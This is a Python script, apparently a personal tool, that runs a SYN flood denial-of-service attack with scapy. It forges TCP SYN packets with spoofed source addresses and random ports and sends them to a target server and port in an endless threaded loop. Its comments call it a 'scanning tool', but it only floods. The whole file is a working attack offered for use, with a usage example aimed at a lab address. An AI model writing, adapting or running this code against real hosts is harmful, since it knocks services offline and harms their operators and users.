# coding=utf-8
'''
Created on 2020-03-28

@author: dabaicai
'''
import os
import sys
from random import randint
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from scapy.layers.inet import IP, ICMP, UDP, TCP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sr1, sendp, srp1, send

'''
多线程扫描工具
'''


class SynFloodUtil(object):
    '''
    tcp-package
    '''

    def __init__(self, iFace, client, server, sPort, dPort, timeout):
        threading.Thread.__init__(self)
        self.iFace = iFace
        self.client = client
        self.server = server
        self.sPort = sPort
        self.dPort = dPort
        self.timeout = timeout

    def sendTcpPck(self):
        print("send syn from %s: " % self.sPort)
        ip = IP(src=self.client, dst=self.server)
        # 发送SYN请求
        send(ip / TCP(dport=self.dPort, sport=self.sPort, flags='S'))

    def run(self):
        self.sendTcpPck()


'''
多线程工具类
'''


class MultiThreadTools(object):
    # 默认线程数
    __defThreadNum = 10

    def __init__(self, argv):
        # args为传递进来的参数
        self.argv = argv

    def startMultiThreads(self):
        iFace = self.argv[1]
        clientSeg = self.argv[2]
        server = self.argv[3]
        dPort = int(self.argv[4])
        self.__defThreadNum = int(self.argv[5])
        frequency = int(self.argv[6])
        timeout = 3
        if len(self.argv) == 8:
            timeout = int(self.argv[7])
        print("start SynFlood Attack...")

        '''
        开始线程池处理，每间隔frequency，添加与参数相同的线程入池扫描
        '''
        # 初始化线程池
        executor = ThreadPoolExecutor(self.__defThreadNum)
        while True:
            for i in range(self.__defThreadNum):
                sPort = randint(1, 65535)
                client = clientSeg + str(randint(1, 255))
                synFloodUtil = SynFloodUtil(iFace, client, server, sPort, dPort, timeout)
                task = executor.submit(synFloodUtil.run(), ())
            print("========== sleep %s ==========" % frequency)
            time.sleep(frequency)


if __name__ == '__main__':
    # eg:
    # python3 SynFloodUtil.py vmnet8 10.1.1. 172.16.197.135 80 6 5 3
    if len(sys.argv) != 7 and len(sys.argv) != 8:
        print(
            "invalid option, the usage: python3 SynFloodUtil.py [iFace] [clientSeg] [server] [dPort]"
            " [threadNum] [frequency] [timeout]")
    else:
        multiThreadTools = MultiThreadTools(sys.argv)
        multiThreadTools.startMultiThreads()
